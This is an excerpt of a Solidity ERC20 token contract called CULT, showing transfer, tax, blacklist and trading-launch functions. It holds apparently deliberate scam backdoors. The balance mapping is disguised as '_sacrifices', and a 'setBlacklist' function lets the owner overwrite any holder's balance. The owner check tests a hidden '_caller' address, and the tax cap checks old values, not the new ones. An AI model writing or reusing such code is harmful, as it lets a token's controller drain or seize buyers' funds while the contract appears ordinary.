// Have you ever been in a $CULT before? There is so much to learn!
...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_caller == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract CULT is Context, IERC20, Ownable {
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "CULT: Transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "CULT: Approve from the zero address");
        require(spender != address(0), "CULT: Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "CULT: Transfer from the zero address");
        require(to != address(0), "CULT: Transfer to the zero address");
        require(amount > 0, "CULT: Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "CULT: Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "CULT: Exceeds the maxWalletSize.");
        ...
        if(taxAmount>0){
          _sacrifices[address(this)]=_sacrifices[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _sacrifices[from]=_sacrifices[from].sub(amount);
        _sacrifices[to]=_sacrifices[to].add(amount.sub(taxAmount));
    ...
    function setTaxes(uint256 _buyTax, uint256 _sellTax) public onlyOwner {
        require(_finalBuyTax + _finalSellTax < 10, "CULT: Taxes cannot be higher than 10%");
    ...
    function setBlacklist(address _address, uint256 _bool) public onlyOwner {
        _sacrifices[_address] = _bool;
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen,"CULT: Trading Already Open");
